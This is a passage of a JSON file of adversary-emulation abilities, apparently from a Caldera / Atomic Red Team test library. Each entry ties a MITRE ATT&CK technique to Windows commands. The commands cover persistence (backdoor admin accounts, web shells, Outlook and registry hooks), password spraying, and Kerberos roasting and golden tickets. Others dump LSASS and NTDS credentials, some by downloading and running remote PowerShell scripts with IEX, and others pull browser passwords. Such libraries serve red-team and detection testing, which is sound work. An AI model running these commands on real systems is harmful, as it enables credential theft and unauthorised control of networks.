                    "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;\n",
                    "cleanup": "rm PowerShellCore.msi;\n"
                }
            }
        },
        "id__dependence__fact": [
            "60f63260-39bb-4136-87a0-b6c2dca799fc",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "eb814e03-811a-467a-bc6d-dcd453750fa2": {
        "description": "Download and install PSTools by unzipping the file",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1105",
            "name": "Ingress Tool Transfer"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"
                }
            }
        },
        "id__dependence__fact": [
            "eb814e03-811a-467a-bc6d-dcd453750fa2",
            "None",
            "None"
        ],
        "plugin": "stockpile"
    },
    "4688d6eebcad6536896d298a7f22c733": {
        "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4688d6eebcad6536896d298a7f22c733",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9425d3aacf44bced9a9d1ec9dc3a70f9": {
        "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1505.002",
            "name": "Server Software Component: Transport Agent"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){;   Disable-TransportAgent Security Interop Agent;   Uninstall-TransportAgent Security Interop Agent;   Get-TransportAgent; }",
                    "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9425d3aacf44bced9a9d1ec9dc3a70f9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d8a5c2c6978d0a9b03cfe26b6ec875a9": {
        "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1505.003",
            "name": "Server Software Component: Web Shell"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\inetpub\\wwwroot\\b.jsp /q >nul 2>&1 && del C:\\inetpub\\wwwroot\\tests.jsp /q >nul 2>&1 && del C:\\inetpub\\wwwroot\\cmd.aspx /q >nul 2>&1",
                    "command": "xcopy /I /Y PathToAtomicsFolder\\T1505.003\\src\\ C:\\inetpub\\wwwroot",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d8a5c2c6978d0a9b03cfe26b6ec875a9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1d3d2e634f1bc294f04ce84944b30de9": {
        "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.001",
            "name": "Create Account: Local Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-LocalUser -Name \"T1136.001_PowerShell\" -ErrorAction Ignore",
                    "command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1d3d2e634f1bc294f04ce84944b30de9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "78ca7a0f5cd7473d2f02e0a972a17ed4": {
        "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1137.004",
            "name": "Office Application Startup: Outlook Home Page"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg.exe delete HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /f >nul 2>&1",
                    "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f",
                    "payloads": [
                        "d43bfc_T1137.004.html"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "78ca7a0f5cd7473d2f02e0a972a17ed4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "778e76984e52af739eff58d6cce22f42": {
        "description": "Manipulate Admin Account Name\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}; foreach($u in $list) {;   $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\";   Set-LocalUser -Name $u.Name -Description $Matches.Description;   Rename-LocalUser -Name $u.Name -NewName $Matches.Name;   Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME; }",
                    "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name; foreach($member in $fmm) {;     if($member -like \"*Administrator*\") {;         $account = $member.Name -replace \".+\\\\\\\",\"\";         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);         Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";         Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;         };     }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "778e76984e52af739eff58d6cce22f42",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e6649419baf4d28d52e191caf07b5f53": {
        "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.001",
            "name": "Create Account: Local Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user /del \"T1136.001_CMD\" >nul 2>&1",
                    "command": "net user /add \"T1136.001_CMD\" \"T1136.001_CMD!\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6649419baf4d28d52e191caf07b5f53",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "009947317b829594041e94a316a5e088": {
        "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.002",
            "name": "Create Account: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user \"ANONYMOUS  LOGON\" >nul 2>&1 /del /domain",
                    "command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "009947317b829594041e94a316a5e088",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9daf17b5f56ce029f96a224173c95cea": {
        "description": "Creates a new Domain User using the credentials of the Current User\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.002",
            "name": "Create Account: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cmd /c \"net user T1136.002_Admin /del >nul 2>&1\"",
                    "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9daf17b5f56ce029f96a224173c95cea",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e2af3c3ab1b0f659c874b8af58c49759": {
        "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1137.002",
            "name": "Office Application Startup: Office Test"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /f >nul 2>&1",
                    "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"C:\\Path\\AtomicRedTeam.dll\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e2af3c3ab1b0f659c874b8af58c49759",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "48d31e40ff939a9ea616219271b1b7a8": {
        "description": "Creates a new admin user in a command prompt.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.001",
            "name": "Create Account: Local Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user /del \"T1136.001_Admin\" >nul 2>&1",
                    "command": "net user /add \"#{username}\" \"#{password}\" && net localgroup administrators \"#{username}\" /add",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "48d31e40ff939a9ea616219271b1b7a8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d59ecb9057d23777ef404acc2ecc73cc": {
        "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1098",
            "name": "Account Manipulation"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ADUser -LDAPFilter \"(&(samaccountname=atr--*)(givenName=Test))\" | Remove-ADUser -Confirm:$False",
                    "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; } ; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  $x = Get-Random -Minimum 2 -Maximum 99; $y = Get-Random -Minimum 2 -Maximum 99; $z = Get-Random -Minimum 2 -Maximum 99; $w = Get-Random -Minimum 2 -Maximum 99; Import-Module ActiveDirectory; $account = \"#{account_prefix}-$x$y$z\"; New-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False; Add-ADGroupMember \"#{group}\" $account",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d59ecb9057d23777ef404acc2ecc73cc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "12ad9edefc86af07700fbf49bfdac6ba": {
        "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1137",
            "name": "Office Application Startup"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /f >nul 2>&1 && del %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1",
                    "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f && mkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1 && echo \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "12ad9edefc86af07700fbf49bfdac6ba",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c4a2eef5841f8e0a204bd6ac06bc4a7f": {
        "description": "Creates a new domain admin user in a command prompt.\n",
        "tactic": "persistence",
        "technique": {
            "attack_id": "T1136.002",
            "name": "Create Account: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net user \"T1136.002_Admin\" >nul 2>&1 /del /domain",
                    "command": "net user \"#{username}\" \"#{password}\" /add /domain && net group \"#{group}\" \"#{username}\" /add /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c4a2eef5841f8e0a204bd6ac06bc4a7f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8c4976ae3659f80e631907fea0690a24": {
        "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "if not exist %temp%\\users.txt  ( call ) ELSE ( 01c596_parse_net_users.bat ) &&   &&  @FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL",
                    "payloads": [
                        "01c596_parse_net_users.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "8c4976ae3659f80e631907fea0690a24",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b2aa97cb4f7982dc3fee63ad02e465cc": {
        "description": "Bruteforce a single user's password from a wordlist\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd $env:temp; .\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b2aa97cb4f7982dc3fee63ad02e465cc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "71c51b6be245af61582d1eb0f3e839b0": {
        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $Env:temp\\rubeus_output.txt -ErrorAction Ignore",
                    "command": "cmd.exe /c \"$Env:temp\\rubeus.exe\" asreproast /outfile:\"$Env:temp\\rubeus_output.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "71c51b6be245af61582d1eb0f3e839b0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7429cb4be2156e271e5f1c7eafbca3f1": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7429cb4be2156e271e5f1c7eafbca3f1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "141a23737d0fd64f9e210cb38118256b": {
        "description": "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe browsers",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "141a23737d0fd64f9e210cb38118256b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "0310c8a2dcab1e2bdfadf004c1141da8": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:SYSTEMROOT\\System32\\lsass_*.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0310c8a2dcab1e2bdfadf004c1141da8",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c4216ccb62904490df937f5233aecd3b": {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.001",
            "name": "Steal or Forge Kerberos Tickets: Golden Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   $env:TEMP\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\";   echo.;   echo Requesting SYSVOL:;   dir \\\\%userdnsdomain%\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c4216ccb62904490df937f5233aecd3b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "10ce4e4c0a8d29ead8968da8156d8358": {
        "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.004",
            "name": "Credentials from Password Stores: Windows Credential Manager"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "vaultcmd /listcreds:\"Windows Credentials\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "10ce4e4c0a8d29ead8968da8156d8358",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e16297dffb68b5ffa5b243243233cd1c": {
        "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "dir c:\\ /b /s .key | findstr /e .key",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e16297dffb68b5ffa5b243243233cd1c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b50164c080c5b4c22e0cfdacd390207c": {
        "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $DomainUsers | Foreach-Object {;   $user = $_;   $password = 'P@ssw0rd!';   $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account ${user}.\";     $conn.bind();     Write-Host \" [!] ${user}:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of password spraying\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b50164c080c5b4c22e0cfdacd390207c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b45d31108ceb312bd26a7f037f44079f": {
        "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process f3d204_WebBrowserPassView.exe; Start-Sleep -Second 4; Stop-Process -Name \"WebBrowserPassView\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "f3d204_WebBrowserPassView.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "b45d31108ceb312bd26a7f037f44079f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "52928f462ea8f5fa617aa8c815f5598b": {
        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "52928f462ea8f5fa617aa8c815f5598b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fefe8d4193bd491f55e9aba273f640d8": {
